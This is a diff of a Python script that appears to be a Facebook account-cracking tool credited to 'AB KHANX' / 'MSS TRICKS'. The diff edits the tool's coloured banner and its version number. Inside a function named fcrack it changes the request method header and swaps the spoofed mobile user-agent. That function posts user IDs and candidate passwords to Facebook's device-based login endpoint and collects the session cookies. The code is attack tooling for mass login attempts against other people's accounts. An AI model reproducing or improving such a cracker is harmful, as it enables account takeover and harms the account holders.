@@ -159,12 +159,12 @@ logo=("""\033[1;92m
         ##     ##    ##    ##    ##    ## 
         ##     ##     ######      ######                                                               
 \033[1;34m--------------------------------------------------
-\033[1;39m \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m✙ \033[1;33m AB KHANX
-\033[1;39m \033[0;92m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m✙ \033[1;32mMSS TRICKS
-\033[1;39m \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m✙ \033[1;33mAB KHANX
-\033[1;39m \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m✙ \033[1;34mMSS TRICKS HOME
-\033[1;39m \033[0;95m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m✙ \033[0;92mFREE AND ENJOY
-\033[1;39m \033[0;96m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m✙ \033[1;31m1.1
+\033[1;39m \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m: \033[1;33mAB KHANX
+\033[1;39m \033[0;92m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m: \033[1;32mMSS TRICKS
+\033[1;39m \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m: \033[1;33mAB KHANX
+\033[1;39m \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m: \033[1;34mMSS TRICKS HOME
+\033[1;39m \033[0;95m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m: \033[0;92mFREE AND ENJOY
+\033[1;39m \033[0;96m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m: \033[1;32m1.3
 \033[1;34m--------------------------------------------------""")
 def linex():
 	print('\33[1;37m--------------------------------------------------')
@@ -827,7 +827,7 @@ def fcrack(uid,pwx,tl):
 			"pass":ps,
 			"login":"Log In"}
 			header_freefb = {'authority': 'x.facebook.com',
-            'method': 'POST',
+            'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
@@ -840,7 +840,7 @@ def fcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; U; Android 8.0.0; en-us; Infinix X608 Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36',}
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
 			lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
